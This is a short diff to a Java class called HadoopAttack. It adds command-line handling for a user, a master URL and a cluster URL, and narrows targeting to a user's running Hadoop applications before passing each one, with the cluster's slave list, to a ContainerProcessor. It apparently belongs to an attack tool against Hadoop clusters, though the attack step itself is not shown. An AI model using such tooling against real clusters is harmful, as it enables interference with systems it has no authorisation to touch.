@@ -19,18 +19,22 @@ public class HadoopAttack {
 	private static String user = "hadoop";
 
 	public static void main(String[] args) {
-		if (args.length >= 1) {
+		if (args.length == 1) {
 			user = args[0];
+		}else if(args.length == 3){
+			user = args[0];
+			masterUrl = args[1];
+			clusterUrl = args[2];
+		}else{
+			System.out.println("args: user masterurl clusterurl");
+			return;
 		}
 		List<Application> appList = Tools.getAppList(masterUrl, encoding);
 		for (Application app : appList) {
-			if (app.getUser().equals(user)) {
+			if (app.getUser().equals(user) && app.getStatus().equals("RUNNING")) {
 				System.out.println("Get App Id:" + app.getId());
 				ArrayList<String> slavers = Tools.getSlaverList(clusterUrl,
 						encoding);
-				for(String sla : slavers){
-					System.out.println("Slaver: " + sla);
-				}
 				ContainerProcessor containerProcessor = new ContainerProcessor(
 						app, slavers);
 				containerProcessor.run();
